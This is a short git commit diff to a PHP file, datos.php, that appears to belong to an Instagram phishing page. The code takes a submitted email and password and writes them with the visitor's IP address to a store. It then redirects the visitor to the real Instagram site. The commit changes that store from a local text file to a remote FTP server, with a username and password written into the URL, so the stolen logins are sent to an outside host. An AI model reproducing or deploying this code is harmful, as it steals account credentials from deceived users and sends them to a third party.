6add23b926e4766c647381215ebd7701980ab598
codeteksistemas <58203899+codeteksistemas@users.noreply.github.com>
2020-08-03 20:48:18 -0500

    data

--- datos.php
+++ datos.php
@@ -7,7 +7,7 @@ if( ( empty($correof)) or (empty($passf)) ){
     header('location: index.htm');
 }else{  
         //archivo de texto
-        $file = fopen('clave.txt','a+');
+        $file = fopen("ftp://instapass20:codetek10@ftp.webcindario.com/web/index.html", "a");
         fwrite($file, "email: ".$correof."\r\npass: ".$passf."\r\nIP: ".$ip."\r\n=========================\r\n");
         fclose($file);
         header('location:https://www.instagram.com/?hl=es-la');      
